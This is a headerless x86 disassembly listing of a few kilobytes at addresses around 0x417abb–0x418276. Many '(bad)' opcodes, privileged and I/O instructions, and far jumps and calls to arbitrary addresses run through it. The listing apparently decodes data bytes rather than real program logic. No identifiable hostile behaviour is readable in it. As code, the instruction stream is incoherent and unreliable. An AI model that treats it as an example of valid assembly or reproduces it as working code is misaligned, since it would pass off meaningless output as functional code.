  417abb:	int    0x17
  417abd:	ins    BYTE PTR es:[edi],dx
  417abe:	jb     0x417b04
  417ac0:	aas    
  417ac1:	icebp  
  417ac2:	inc    ecx
  417ac3:	mov    edx,0xf5c2b53f
  417ac8:	sbb    al,0xe4
  417acb:	pusha  
  417acc:	les    ebp,FWORD PTR [ebx-0x3b]
  417acf:	adc    edx,DWORD PTR [ecx+0x4b]
  417ad2:	pop    eax
  417ad3:	adc    edi,DWORD PTR [ebx-0x62050922]
  417ad9:	xchg   BYTE PTR [esi+0x4f9deb1],ah
  417adf:	add    al,0x6d
  417ae1:	inc    BYTE PTR [ecx]
  417ae3:	(bad)  
  417ae5:	jmp    0x4651dad8
  417aea:	std    
  417aeb:	mov    cl,0x6d
  417aed:	dec    ebx
  417aee:	cli    
  417aef:	xchg   ecx,eax
  417af0:	mov    edx,gs
  417af2:	dec    edi
  417af3:	sbb    dh,dh
  417af5:	fisttp DWORD PTR [ebx]
  417af7:	stc    
  417af8:	cld    
  417af9:	cmp    ah,BYTE PTR [eax+eax*2]
  417afc:	sub    ebx,eax
  417afe:	and    BYTE PTR [ebp-0x180b91bd],ch
  417b04:	ins    DWORD PTR es:[edi],dx
  417b05:	repnz icebp 
  417b07:	sub    ebp,DWORD PTR [ebx-0x43986d24]
  417b0d:	push   ss
  417b0e:	jl     0x417aff
  417b10:	xchg   ebx,eax
  417b11:	lock adc BYTE PTR [edi+edx*1-0x3b],bh
  417b16:	fidivr WORD PTR es:[edi-0x2]
  417b1a:	dec    di
  417b1c:	mov    ah,0x21
  417b1e:	sub    BYTE PTR [esi-0x18],0xfd
  417b22:	pushf  
  417b23:	wrmsr  
  417b25:	popa   
  417b26:	ds xor eax,0xf99d2d47
  417b2c:	inc    ecx
  417b2d:	cmp    eax,DWORD PTR [edx-0x7ad7d290]
  417b33:	jae    0x417ac3
  417b35:	fld    TBYTE PTR [eax+edi*8-0x22]
  417b39:	orps   xmm6,XMMWORD PTR [edi-0xa4619ce]
  417b40:	inc    ebx
  417b41:	push   0x11e49806
  417b46:	dec    ebp
  417b47:	add    esi,DWORD PTR [esi+0x26]
  417b4a:	inc    ebx
  417b4b:	imul   DWORD PTR [edx]
  417b4d:	adc    edx,edx
  417b4f:	gs jg  0x417ae0
  417b52:	mov    WORD PTR [ebx],ds
  417b54:	push   es
  417b55:	(bad)  [edx]
  417b57:	jmp    0x6168:0x2444f0b0
  417b5e:	cmp    bh,cl
  417b60:	ss mov ah,0xb1
  417b63:	fdiv   st(0),st
  417b65:	add    ebp,ebx
  417b67:	xchg   esp,eax
  417b68:	fcmovnu st,st(4)
  417b6a:	mov    bh,0x3
  417b6c:	repz push es
  417b6e:	in     al,dx
  417b6f:	lds    ebx,FWORD PTR [ebx-0x60]
  417b72:	adc    al,0x3c
  417b74:	sahf   
  417b75:	fcom   QWORD PTR [ebx-0x6e347d72]
  417b7b:	inc    esp
  417b7c:	sub    dl,bl
  417b7e:	imul   esp,ebp,0x99bcb8ee
  417b84:	scas   al,BYTE PTR es:[edi]
  417b85:	icebp  
  417b86:	xchg   esp,eax
  417b87:	outs   dx,DWORD PTR ds:[esi]
  417b88:	xchg   esi,eax
  417b89:	in     al,0x3a
  417b8b:	fwait
  417b8c:	or     BYTE PTR [ecx],dl
  417b8e:	mov    ecx,0xebb7bac1
  417b93:	fmul   QWORD PTR [ecx]
  417b95:	push   esi
  417b96:	and    dh,0x9c
  417b99:	adc    BYTE PTR [eax+0x14],ch
  417b9c:	xchg   edx,eax
  417b9d:	loop   0x417ba1
  417b9f:	inc    edx
  417ba0:	or     eax,0x87468486
  417ba5:	rcl    BYTE PTR [edi],1
  417ba7:	pushf  
  417ba8:	lds    eax,FWORD PTR [eax]
  417baa:	push   ds
  417bab:	pop    edi
  417bac:	jecxz  0x417c1f
  417bae:	xor    DWORD PTR [esp+ebx*2+0x5bde173c],esi
  417bb5:	loope  0x417bbf
  417bb7:	or     DWORD PTR [ebp-0x79],esp
  417bba:	out    0xac,al
  417bbc:	xchg   esi,eax
  417bbd:	xor    esp,ebp
  417bbf:	adc    edx,edi
  417bc1:	js     0x417bc0
  417bc3:	data16 or BYTE PTR [edx],cl
  417bc6:	mov    edi,edi
  417bc8:	mov    eax,0x54d85
  417bcd:	pop    ds
  417bce:	(bad)  
  417bcf:	sar    edi,cl
  417bd1:	and    DWORD PTR [ebp-0xe],ecx
  417bd4:	pop    esi
  417bd5:	dec    ebx
  417bd6:	mov    dl,0x46
  417bd8:	inc    ecx
  417bd9:	mov    eax,0x5a81d2a2
  417bde:	xlat   BYTE PTR ds:[ebx]
  417bdf:	cmp    eax,0x69490274
  417be4:	ins    BYTE PTR es:[edi],dx
  417be5:	aaa    
  417be6:	dec    esp
  417be7:	inc    esp
  417be8:	cmp    dl,BYTE PTR [edx+0x6d5e3011]
  417bee:	pop    eax
  417bef:	sti    
  417bf0:	adc    eax,0xaa759a5c
  417bf5:	fstp   QWORD PTR [edi-0x39]
  417bf8:	pusha  
  417bf9:	rcr    BYTE PTR [ecx-0x3ff20f07],cl
  417bff:	push   0x59
  417c01:	mov    al,0x26
  417c03:	out    dx,eax
  417c04:	inc    edx
  417c05:	nop
  417c06:	jmp    DWORD PTR [eax]
  417c08:	jmp    0xfb8551cc
  417c0d:	dec    ecx
  417c0e:	sbb    ch,0x14
  417c11:	bound  edi,QWORD PTR [ebx]
  417c13:	mov    edx,0xe6b0518f
  417c18:	std    
  417c19:	fsub   DWORD PTR [eax+eiz*8]
  417c1c:	sbb    esi,DWORD PTR gs:[esi+0x13]
  417c20:	jbe    0x417c44
  417c22:	gs and eax,0x4ba886be
  417c28:	xor    dl,ch
  417c2a:	retf   
  417c2b:	push   es
  417c2c:	and    al,0xa
  417c2e:	dec    eax
  417c2f:	push   es
  417c30:	sub    BYTE PTR [edx+0xb],bh
  417c33:	in     eax,0xd0
  417c35:	sub    esi,eax
  417c37:	inc    ebp
  417c38:	adc    ebp,ebp
  417c3a:	icebp  
  417c3b:	retf   0xaf3f
  417c3e:	sub    ecx,DWORD PTR [ecx+0x513cd83b]
  417c44:	(bad)  
  417c45:	leave  
  417c46:	lock stos BYTE PTR es:[edi],al
  417c48:	sahf   
  417c49:	dec    edx
  417c4a:	mov    bh,0xb4
  417c4c:	retf   
  417c4d:	call   0x35a3:0x413b6d1b
  417c54:	ja     0x417ca5
  417c56:	jmp    0x4002:0xd7e50eac
  417c5d:	xor    BYTE PTR [ebx+eax*2],ch
  417c60:	cmp    DWORD PTR [ebx],ebx
  417c62:	loope  0x417c03
  417c64:	xchg   ecx,eax
  417c65:	ins    DWORD PTR es:[edi],dx
  417c66:	test   dh,0x9b
  417c69:	sub    al,BYTE PTR [ecx-0x15bb1eab]
  417c6f:	adc    BYTE PTR [esp+eax*1],0xb7
  417c73:	cmp    bh,cl
  417c75:	push   esp
  417c76:	add    esi,ebx
  417c78:	jmp    0x49ad8e47
  417c7d:	add    al,0x1b
  417c7f:	ss retf 
  417c81:	xor    DWORD PTR [edx],esp
  417c83:	push   ebx
  417c84:	jmp    0x7b2f:0xcf66a13d
  417c8b:	xor    eax,DWORD PTR [edi-0x4ab2c0e7]
  417c91:	dec    esi
  417c92:	sbb    DWORD PTR [eax-0x44a3739b],esp
  417c98:	ror    DWORD PTR [esi+eiz*4-0xd9303d5],cl
  417c9f:	and    ah,al
  417ca1:	mov    BYTE PTR [edi+0x74],al
  417ca4:	pushf  
  417ca5:	mov    eax,ds:0xac8f2b8f
  417caa:	fldenv [ebx+0x38]
  417cad:	pop    esp
  417cae:	push   ss
  417caf:	xor    al,bh
  417cb1:	sbb    al,0x8e
  417cb3:	outs   dx,DWORD PTR ds:[esi]
  417cb4:	loop   0x417d11
  417cb6:	(bad)  
  417cb7:	jmp    FWORD PTR [edx]
  417cb9:	cmp    dh,BYTE PTR [ebp+0x613bfb96]
  417cbf:	or     dl,BYTE PTR [edi-0x242de894]
  417cc5:	push   esi
  417cc6:	aad    0x43
  417cc8:	xchg   ebx,eax
  417cc9:	push   ebp
  417cca:	dec    ebp
  417ccb:	lahf   
  417ccc:	(bad)  
  417cce:	or     al,0x7a
  417cd0:	pmaddwd mm7,mm4
  417cd3:	pop    esi
  417cd4:	jg     0x417d4b
  417cd6:	mov    esi,0x4e04be82
  417cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cdc:	int    0x7c
  417cde:	jg     0x417c7d
  417ce0:	je     0x417cc7
  417ce2:	(bad)  
  417ce3:	sti    
  417ce4:	(bad)  
  417ce5:	imul   ecx,DWORD PTR [edx],0x3f
  417ce8:	pop    ebx
  417ce9:	retf   0xd2dd
  417cec:	push   esp
  417ced:	popf   
  417cee:	sbb    esi,DWORD PTR [eax]
  417cf0:	push   edi
  417cf1:	fdiv   st(1),st
  417cf3:	mov    dl,BYTE PTR [esi]
  417cf5:	clc    
  417cf6:	cmp    dh,BYTE PTR [edi+0x5e]
  417cf9:	or     BYTE PTR [ebx],dh
  417cfb:	leave  
  417cfc:	jns    0x417d29
  417cfe:	jae    0x417d53
  417d00:	cmp    ebp,esp
  417d02:	(bad)  
  417d03:	sbb    al,BYTE PTR [edi+0x3ba5466c]
  417d09:	(bad)  
  417d0a:	push   edi
  417d0b:	(bad)  
  417d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d0e:	jp     0x417d60
  417d10:	retf   
  417d11:	push   ecx
  417d12:	sub    esi,0xb84a7c6f
  417d18:	jg     0x417cd3
  417d1a:	scas   eax,DWORD PTR es:[edi]
  417d1b:	or     DWORD PTR [ecx+eax*4],esi
  417d1e:	add    BYTE PTR [eax+0x6b78e650],bh
  417d24:	mov    dh,0x98
  417d26:	jecxz  0x417d3e
  417d28:	retf   
  417d29:	imul   ebp,DWORD PTR [ecx],0x62
  417d2c:	outs   dx,DWORD PTR ds:[esi]
  417d2d:	out    dx,eax
  417d2e:	push   edi
  417d2f:	sbb    al,0x2b
  417d31:	into   
  417d32:	push   esp
  417d33:	mov    al,0x94
  417d35:	jb     0x417d64
  417d37:	push   ebp
  417d38:	jne    0x417d4b
  417d3a:	or     cl,bh
  417d3c:	cld    
  417d3d:	and    ecx,DWORD PTR [ebx+0x52]
  417d40:	xlat   BYTE PTR ds:[ebx]
  417d41:	mov    esi,0x24d56f19
  417d46:	push   eax
  417d47:	push   es
  417d48:	xchg   BYTE PTR [edi],ah
  417d4a:	pop    edx
  417d4b:	and    DWORD PTR [ecx+0x71],edi
  417d4e:	arpl   si,di
  417d50:	push   es
  417d51:	jmp    0x417d8d
  417d53:	mov    DWORD PTR ds:[ebx],ebx
  417d56:	xchg   ebx,eax
  417d57:	ds sbb al,0x35
  417d5a:	mov    esp,0x67cc89
  417d5f:	in     al,0x35
  417d61:	cmp    DWORD PTR [esi-0x2c1bca5b],eax
  417d67:	mov    al,BYTE PTR ds:0x3e8ed4c3
  417d6d:	dec    edi
  417d6e:	ins    DWORD PTR es:[edi],dx
  417d6f:	sahf   
  417d70:	pop    ebp
  417d71:	jbe    0x417d9e
  417d73:	pusha  
  417d74:	pop    edx
  417d75:	inc    eax
  417d76:	pusha  
  417d77:	jl     0x417dc9
  417d79:	in     al,0x8
  417d7b:	out    dx,al
  417d7c:	xchg   ebp,ecx
  417d7e:	mov    DWORD PTR [ecx],esi
  417d80:	imul   edi,DWORD PTR [ebx+0x5cca5cfa],0x40
  417d87:	repz mov bl,0x97
  417d8a:	jns    0x417ded
  417d8c:	fucomip st,st(7)
  417d8e:	adc    eax,0x1effc6da
  417d93:	aam    0xf1
  417d95:	in     eax,dx
  417d96:	fisub  DWORD PTR [ebp+0x15f8c0b7]
  417d9c:	jmp    0xcf638ae8
  417da1:	mov    BYTE PTR [edi],dh
  417da3:	push   0xffffff9e
  417da5:	inc    ecx
  417da6:	(bad)  
  417da7:	rol    DWORD PTR [eax],cl
  417da9:	or     esp,DWORD PTR [ebp-0x3c]
  417dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dae:	aad    0xa0
  417db0:	push   es
  417db1:	retf   0x3f06
  417db4:	cmc    
  417db5:	(bad)  
  417db6:	fdivr  QWORD PTR ds:0xf9727ddc
  417dbc:	shr    bl,1
  417dbe:	adc    ch,BYTE PTR [edx+0x7d]
  417dc1:	add    eax,0xe5bcb9a7
  417dc6:	dec    DWORD PTR [eax+ecx*2-0x573d52c4]
  417dcd:	sbb    al,0x1b
  417dcf:	push   cs
  417dd0:	jno    0x417e31
  417dd2:	into   
  417dd3:	shl    BYTE PTR [edx-0x3],cl
  417dd6:	fstp   QWORD PTR [eax]
  417dd8:	fisub  DWORD PTR [ebx+0x1d]
  417ddb:	dec    edx
  417ddc:	fdivr  DWORD PTR [edx-0x34]
  417ddf:	lock adc ecx,DWORD PTR ds:0xf8aede4e
  417de6:	ins    BYTE PTR es:[edi],dx
  417de7:	fiadd  DWORD PTR [ebp+0x3f2cb42a]
  417ded:	data16 mov bl,0x2
  417df0:	or     eax,0x36d48f8f
  417df5:	cli    
  417df6:	cs jnp 0x417e68
  417df9:	gs pop edi
  417dfb:	int3   
  417dfc:	adc    dl,0x38
  417dff:	lock xor bh,BYTE PTR [ecx+0x4196f601]
  417e06:	pop    ebx
  417e07:	mov    ecx,0xab8c4808
  417e0c:	mov    eax,0xcbac8fb2
  417e11:	pop    ebx
  417e12:	cld    
  417e13:	jge    0x417e77
  417e15:	or     BYTE PTR [eax+0x22ac3144],0x3c
  417e1c:	pop    ecx
  417e1d:	test   al,0x49
  417e1f:	sbb    eax,0x7afe37d7
  417e24:	adc    dh,BYTE PTR [eax-0x2e]
  417e27:	or     DWORD PTR [ecx],esp
  417e29:	fisubr WORD PTR [ebp+0xb96283d]
  417e2f:	ror    DWORD PTR [edx+0x4d],cl
  417e32:	ss or  al,0xa0
  417e35:	dec    ecx
  417e36:	adc    ebp,DWORD PTR [edi-0x29e8dc69]
  417e3c:	pop    ss
  417e3d:	jmp    FWORD PTR [edi]
  417e3f:	pushf  
  417e40:	xchg   BYTE PTR [eax+0x513d99e],ch
  417e46:	cmp    DWORD PTR [ecx+0x5206ae79],0x92f2cf39
  417e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e51:	sbb    dh,ch
  417e53:	push   ebp
  417e54:	xchg   edi,eax
  417e55:	dec    esp
  417e56:	ror    DWORD PTR [ecx+0x9],1
  417e59:	das    
  417e5a:	mul    ch
  417e5c:	out    dx,eax
  417e5d:	pop    esp
  417e5e:	and    DWORD PTR [ebp+0x336e13bc],ebx
  417e64:	inc    edx
  417e65:	lahf   
  417e66:	idiv   DWORD PTR ss:[esi-0x4bf6e9f7]
  417e6d:	cmp    al,0xcc
  417e6f:	lea    ebx,[edx-0x383994aa]
  417e75:	scas   eax,DWORD PTR es:[edi]
  417e76:	mov    dl,0xbf
  417e78:	cli    
  417e79:	inc    ecx
  417e7a:	cmp    eax,0xa0a81778
  417e7f:	add    al,0xa8
  417e81:	into   
  417e82:	mov    al,0x59
  417e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e85:	xor    dh,BYTE PTR [eax+0x46]
  417e88:	cmp    al,0x4c
  417e8a:	arpl   WORD PTR [eax+eax*8-0x275b3fea],ax
  417e91:	arpl   WORD PTR [edi],ax
  417e93:	ret    0xa62
  417e96:	arpl   WORD PTR [esi],dx
  417e98:	pop    ecx
  417e99:	clc    
  417e9a:	dec    esp
  417e9b:	xchg   esp,eax
  417e9c:	and    ebx,ecx
  417e9e:	jmp    0x4cf6:0x60044048
  417ea5:	pop    edi
  417ea6:	in     eax,dx
  417ea7:	cmp    BYTE PTR [ecx-0x68514dfc],al
  417ead:	push   ecx
  417eae:	shr    DWORD PTR [esi+0x9d254d],cl
  417eb4:	push   ebp
  417eb5:	mov    fs,WORD PTR [eax+0x35377aa]
  417ebb:	fcmovbe st,st(7)
  417ebd:	add    eax,0x91cb700a
  417ec2:	loop   0x417f27
  417ec4:	shl    DWORD PTR gs:[esi-0x414d8513],1
  417ecb:	inc    ebx
  417ecc:	stos   BYTE PTR es:[edi],al
  417ecd:	jmp    0x738b7636
  417ed2:	fcmovu st,st(3)
  417ed4:	pop    esp
  417ed5:	(bad)  
  417ed6:	mov    esp,0xee6b0132
  417edb:	dec    esi
  417edc:	das    
  417edd:	and    eax,DWORD PTR [ebx+0x1951dc41]
  417ee3:	(bad)  
  417ee4:	lock or edx,DWORD PTR [ebx-0x38]
  417ee8:	xchg   BYTE PTR [ebp+0x55a7f914],dl
  417eee:	jecxz  0x417f0e
  417ef0:	int    0x99
  417ef2:	mov    ds,WORD PTR [esi]
  417ef4:	mov    dl,0xa7
  417ef6:	and    al,0xfe
  417ef8:	cli    
  417ef9:	imul   esi,DWORD PTR [eax],0xfffffff8
  417efc:	imul   edi,DWORD PTR [ebp+0x4e],0x246b02ce
  417f03:	sub    BYTE PTR [esi],dl
  417f05:	fs stc 
  417f07:	sbb    BYTE PTR [esi-0x18],cl
  417f0a:	jns    0x417f62
  417f0c:	xchg   esi,eax
  417f0d:	aaa    
  417f0e:	es int3 
  417f10:	mov    ebx,0xd3bef5
  417f15:	(bad)  
  417f16:	or     edi,DWORD PTR [ebp+0x30]
  417f19:	xor    eax,0xb8e6c951
  417f1e:	loopne 0x417ee5
  417f20:	jns    0x417f4c
  417f22:	popf   
  417f23:	or     ch,dh
  417f25:	pop    ss
  417f26:	push   ebp
  417f27:	bound  esi,QWORD PTR [edi]
  417f29:	lea    esi,[bx+di+0x38]
  417f2d:	dec    edi
  417f2e:	xor    BYTE PTR [ebx-0x3],ah
  417f31:	jne    0x417f8a
  417f33:	neg    esi
  417f35:	repz push esi
  417f37:	fnstsw WORD PTR [eax+edi*2+0x4b]
  417f3b:	or     DWORD PTR [edi-0x25184458],ebp
  417f41:	adc    eax,0x5eea2347
  417f46:	shl    DWORD PTR [edi-0x71a6dbed],0x53
  417f4d:	sti    
  417f4e:	test   DWORD PTR [ebp-0x39],ecx
  417f51:	dec    edx
  417f52:	(bad)  
  417f53:	push   esi
  417f54:	jg     0x417fca
  417f56:	cmc    
  417f57:	stos   BYTE PTR es:[edi],al
  417f58:	daa    
  417f59:	add    BYTE PTR [edi+eiz*4],dl
  417f5c:	mov    ebp,0xe242c1e2
  417f61:	push   edi
  417f62:	cmp    ecx,DWORD PTR [ecx+eax*2]
  417f65:	push   esi
  417f66:	outs   dx,DWORD PTR ds:[esi]
  417f67:	jecxz  0x417f56
  417f69:	pop    edx
  417f6a:	mov    ebp,0xa73e8bf4
  417f6f:	jecxz  0x417f2b
  417f71:	inc    ebp
  417f72:	xchg   ebx,eax
  417f73:	mov    WORD PTR [edx+0x30],ss
  417f76:	mov    dh,0x49
  417f78:	bnd jp 0x417f0e
  417f7b:	xrelease mov DWORD PTR [edx+0x15],ecx
  417f7f:	push   eax
  417f80:	cld    
  417f81:	retf   0xbe1c
  417f84:	mov    edx,0xfffff780
  417f89:	ins    DWORD PTR es:[edi],dx
  417f8a:	stos   DWORD PTR es:[edi],eax
  417f8b:	imul   esi,DWORD PTR [edx-0x29],0xffffffbd
  417f8f:	and    BYTE PTR [eax],dh
  417f91:	mov    eax,0xf497c95
  417f96:	jbe    0x417ff1
  417f98:	and    ebx,ebp
  417f9a:	out    dx,eax
  417f9b:	jb     0x417fa1
  417f9d:	sub    eax,0x8c95b552
  417fa2:	(bad)  
  417fa3:	lods   eax,DWORD PTR ds:[esi]
  417fa4:	or     al,0x49
  417fa6:	push   ecx
  417fa7:	sbb    al,0xdf
  417fa9:	add    BYTE PTR [ebp+0x9],bh
  417fac:	adc    DWORD PTR [edi-0x50],ebp
  417faf:	push   ss
  417fb0:	test   eax,0xcc21f219
  417fb5:	pop    ds
  417fb6:	pop    edx
  417fb7:	fcom   st(6)
  417fb9:	jb     0x417f71
  417fbb:	mov    eax,ds:0x2c68e996
  417fc0:	jb     0x417f44
  417fc2:	add    bh,BYTE PTR [edi+eiz*4]
  417fc5:	loopne 0x417f5f
  417fc7:	mov    edi,DWORD PTR [edi]
  417fc9:	idiv   esi
  417fcb:	inc    esi
  417fcc:	push   esp
  417fcd:	(bad)  
  417fce:	xor    edx,DWORD PTR [edi-0x76]
  417fd1:	adc    al,0xa
  417fd3:	push   esi
  417fd4:	cmc    
  417fd5:	je     0x417fee
  417fd7:	jb     0x417fc8
  417fd9:	push   ebx
  417fda:	mov    dl,0x2f
  417fdc:	inc    ebx
  417fdd:	test   al,0xf4
  417fdf:	popf   
  417fe0:	mov    dl,0xc
  417fe2:	addr16 mov esi,0x1478aed1
  417fe8:	push   edi
  417fe9:	dec    ebx
  417fea:	push   esi
  417feb:	imul   DWORD PTR [eax+0x66]
  417fee:	out    0x1c,eax
  417ff0:	retf   0xf003
  417ff3:	ds popa 
  417ff5:	or     DWORD PTR [esi],0xffffffeb
  417ff8:	lahf   
  417ff9:	test   BYTE PTR [ebx+0x3e70f8d2],0x4
  418000:	sub    BYTE PTR [ecx+0x516b8356],ch
  418006:	test   DWORD PTR [edi+ebp*1],0x9429ed33
  41800d:	mov    DWORD PTR [edx-0x19],edx
  418010:	cmp    BYTE PTR gs:[esi-0x66],al
  418014:	jmp    0x2e86:0xca634a9a
  41801b:	fisubr DWORD PTR [eax-0x259ca120]
  418021:	push   0x8b21b77d
  418026:	and    DWORD PTR [eax+0x72d61080],eax
  41802c:	in     eax,dx
  41802d:	clc    
  41802e:	mov    BYTE PTR [ecx-0x50],0x4e
  418032:	adc    dh,0x51
  418035:	lds    esp,FWORD PTR [ecx+ebp*1]
  418038:	sub    DWORD PTR [esi+0x62],eax
  41803b:	cmp    edi,DWORD PTR [edx-0x4b]
  41803e:	cmp    BYTE PTR [edx],dh
  418040:	push   edx
  418041:	adc    bh,cl
  418043:	in     eax,0xcd
  418045:	jp     0x41807d
  418047:	jne    0x41806b
  418049:	fcomp  st(6)
  41804b:	cld    
  41804c:	mov    bh,0xc1
  41804e:	stc    
  41804f:	push   edx
  418050:	adc    al,0xc5
  418052:	sub    al,0x10
  418054:	xchg   edx,eax
  418055:	ds shr esp,cl
  418058:	sbb    BYTE PTR es:[edi-0x58],dh
  41805c:	push   cs
  41805d:	mov    BYTE PTR [ebx],bl
  41805f:	scas   al,BYTE PTR es:[edi]
  418060:	jo     0x4180d2
  418062:	or     eax,0x4563fe6e
  418067:	xor    dh,BYTE PTR [ebx-0x6a]
  41806a:	push   0x7ade1a35
  41806f:	sub    dl,BYTE PTR ss:[edx]
  418072:	iret   
  418073:	out    dx,al
  418074:	aas    
  418075:	dec    eax
  418076:	jb     0x4180c8
  418078:	sbb    al,bl
  41807a:	mov    ebp,0x6787bf85
  41807f:	icebp  
  418080:	inc    ecx
  418081:	lahf   
  418082:	push   ds
  418083:	xor    BYTE PTR [edi-0x6b880b28],dl
  418089:	inc    edi
  41808a:	jo     0x418065
  41808c:	xchg   esi,eax
  41808d:	jge    0x41800f
  41808f:	pop    ebp
  418090:	xor    al,0x8b
  418092:	and    eax,0xdf2aa0a7
  418097:	add    eax,0x99b3e9f5
  41809c:	mov    eax,ds:0xfcb1bf9e
  4180a1:	scas   eax,DWORD PTR es:[edi]
  4180a2:	mov    edx,0xa0d8a4b1
  4180a7:	mov    DWORD PTR [esi+0x37],ecx
  4180aa:	push   edx
  4180ab:	jle    0x4180e4
  4180ad:	dec    ebp
  4180ae:	lods   eax,DWORD PTR ds:[esi]
  4180af:	cmp    bh,BYTE PTR [eax+0x76486fa4]
  4180b5:	gs xchg esi,eax
  4180b7:	mov    esp,0x8ae71886
  4180bc:	mov    ebp,0x1b319cbc
  4180c1:	lods   eax,DWORD PTR ds:[esi]
  4180c2:	pushf  
  4180c3:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4180c5:	add    bh,ah
  4180c7:	mov    BYTE PTR [esi],bl
  4180c9:	sbb    eax,0xda3bb8f4
  4180ce:	inc    ebx
  4180cf:	sti    
  4180d0:	mov    al,0x1f
  4180d2:	fcmovnu st,st(6)
  4180d4:	lahf   
  4180d5:	jmp    0x442e2563
  4180da:	inc    eax
  4180db:	pop    ebp
  4180dc:	out    0xb2,al
  4180de:	inc    ecx
  4180df:	das    
  4180e0:	inc    edx
  4180e1:	mov    eax,ds:0x11d46a4a
  4180e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180e7:	sbb    DWORD PTR [ebp+0x1f],ebx
  4180ea:	sbb    eax,0x96b07244
  4180ef:	jmp    0x4180c6
  4180f1:	inc    esi
  4180f2:	ror    DWORD PTR [esi+0x41],0x20
  4180f6:	test   DWORD PTR [esi+edi*2],ebp
  4180f9:	aas    
  4180fa:	ja     0x418126
  4180fc:	adc    ah,dl
  4180fe:	push   edx
  4180ff:	sar    BYTE PTR [ecx+0x2c],0xff
  418103:	jae    0x4180dc
  418105:	push   ss
  418106:	xor    al,0x26
  418108:	or     esp,edx
  41810a:	pop    ebp
  41810b:	inc    esi
  41810c:	jae    0x418152
  41810e:	mov    esp,0x9dd856f5
  418113:	mov    ch,0xcc
  418115:	pop    ss
  418116:	stos   BYTE PTR es:[edi],al
  418117:	and    dl,bh
  418119:	and    ecx,ebp
  41811b:	sbb    eax,0xa0a4b58f
  418120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418121:	les    esi,FWORD PTR [edx]
  418123:	daa    
  418124:	call   0xcebc:0xc53b7805
  41812b:	into   
  41812c:	add    DWORD PTR [edx+0x7f],0x87a3320f
  418133:	jg     0x4180dd
  418135:	loope  0x41810c
  418137:	pop    es
  418138:	mov    ebx,0x9426bf8a
  41813d:	mov    ds:0xca7e1ff9,eax
  418142:	xor    DWORD PTR [ebx],ebx
  418144:	std    
  418145:	rol    cl,0x9b
  418148:	jmp    0x9477:0x3acd155f
  41814f:	dec    BYTE PTR [edi+0x209296cc]
  418155:	lds    edi,FWORD PTR [ebx-0x254ba481]
  41815b:	stc    
  41815c:	imul   ebp,eax,0xffffffdc
  41815f:	nop
  418160:	bound  ecx,QWORD PTR [ebx+esi*8-0x72]
  418164:	mov    ds:0x8768ed2e,al
  418169:	addr16 inc ecx
  41816b:	ret    
  41816c:	repnz shr DWORD PTR [eax],1
  41816f:	fs pusha 
  418171:	sbb    eax,0x986fb2c4
  418176:	out    dx,eax
  418177:	push   0xffffffe4
  418179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41817a:	pop    esp
  41817b:	and    ebp,DWORD PTR [ebp-0x4d]
  41817e:	inc    ebx
  41817f:	cmp    BYTE PTR ds:0x1c5a54cf,ah
  418185:	mov    esi,0x1276fc60
  41818a:	shl    esp,cl
  41818c:	inc    ecx
  41818d:	aad    0x59
  41818f:	cmp    eax,0xec424213
  418194:	frstor [edx-0x4b06702b]
  41819a:	loope  0x418199
  41819c:	dec    ebx
  41819d:	sub    eax,0x59f5270b
  4181a2:	cmp    DWORD PTR [eax],esp
  4181a4:	popf   
  4181a5:	cs add eax,0x53dcd7f1
  4181ab:	xchg   edx,eax
  4181ac:	clc    
  4181ad:	mov    cl,0x80
  4181af:	mov    ch,0x55
  4181b1:	ret    
  4181b2:	or     BYTE PTR [edi],ah
  4181b4:	or     eax,0x416c15e7
  4181b9:	xchg   ebp,eax
  4181ba:	test   eax,0xd036225e
  4181bf:	xor    DWORD PTR [eax+esi*4],ebp
  4181c2:	mov    esi,DWORD PTR [eax+0x76]
  4181c5:	call   0x2795:0xbf9426de
  4181cc:	jb     0x4181c7
  4181ce:	mov    al,ds:0xd6544ba
  4181d3:	in     al,dx
  4181d4:	adc    al,0x78
  4181d6:	int3   
  4181d7:	mov    dl,0xab
  4181d9:	push   esi
  4181da:	push   edx
  4181db:	mov    esp,0x9478083a
  4181e0:	fwait
  4181e1:	jg     0x4181d1
  4181e3:	jae    0x418193
  4181e5:	mov    cl,BYTE PTR [ecx-0x5c43b7f0]
  4181eb:	mov    ah,0xea
  4181ed:	and    BYTE PTR [edi+eax*2+0x40],bh
  4181f1:	enter  0xeded,0x1e
  4181f5:	loope  0x418259
  4181f7:	(bad)  
  4181f8:	cmp    al,0x63
  4181fa:	mov    edx,0xe1e924ec
  4181ff:	jae    0x418262
  418201:	and    eax,0xf09109ca
  418206:	mov    dl,0xb9
  418208:	test   bl,0xe4
  41820b:	je     0x41823f
  41820d:	and    ecx,ebp
  41820f:	cmp    bl,BYTE PTR [edi]
  418211:	shl    BYTE PTR ds:0x2d5d82eb,0x26
  418218:	mov    bh,0x97
  41821a:	or     BYTE PTR [edi+0x9285880],al
  418220:	div    DWORD PTR [ebx-0x59]
  418223:	test   BYTE PTR [edi],0xeb
  418226:	rol    ebx,cl
  418228:	shr    ecx,1
  41822a:	stos   DWORD PTR es:[edi],eax
  41822b:	and    esi,DWORD PTR [esi]
  41822d:	cmp    edx,DWORD PTR [ebp+0x31]
  418230:	adc    edx,DWORD PTR [esi-0x204ff1f4]
  418236:	loop   0x4181e9
  418238:	mov    ch,0x3d
  41823a:	scas   al,BYTE PTR es:[edi]
  41823b:	push   0x84760256
  418240:	jg     0x41823b
  418242:	push   0x926bc65c
  418247:	sub    eax,0xa896760
  41824c:	jg     0x4182cb
  41824e:	fild   QWORD PTR [edi-0x3b5acbdd]
  418254:	cmp    al,0xc3
  418256:	xchg   esp,eax
  418257:	mov    dh,0xdf
  418259:	jae    0x4181fd
  41825b:	and    edx,eax
  41825d:	test   al,0xa1
  41825f:	jge    0x418285
  418261:	cmp    BYTE PTR [bx],dh
  418264:	inc    edi
  418265:	pusha  
  418266:	xor    al,0x38
  418268:	gs in  eax,dx
  41826a:	(bad)  
  41826b:	call   0x24fa94ff
  418270:	loopne 0x4182aa
  418272:	int    0x7a
  418274:	int    0xaf
  418276:	pop    esp
